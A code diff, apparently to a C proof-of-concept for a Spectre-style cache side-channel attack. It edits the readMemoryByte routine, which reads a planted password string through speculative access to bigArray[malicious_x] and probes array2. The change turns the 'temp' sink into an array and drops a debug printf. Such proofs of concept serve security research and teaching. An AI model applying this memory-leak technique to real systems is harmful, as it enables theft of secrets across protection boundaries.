@@ -38,7 +38,7 @@ uint8_t unused2[64];
 uint8_t array2[256 * 512];
 uint8_t bigArray[4096*512];
 char secret[] = "The password is rootkea";
-uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+uint8_t temp[50]; /* Used so compiler won’t optimize out victim_function() */
 volatile uint8_t* addr;
 
 void victim_function() {
@@ -84,11 +84,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
         secret[0] = 'q';
         data = bigArray[malicious_x];
         //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
-        temp = array2[data * 512];
-        if (temp == 12) {
-            printf("%d   %d\n", j, array2[data * 512]);
-        }; //Use temp so that it will not be optimized out
-
+        temp[0] = array2[data * 512];
     }
 
     //Now we accessed the point in the memory that is correlated with the data in big[0]
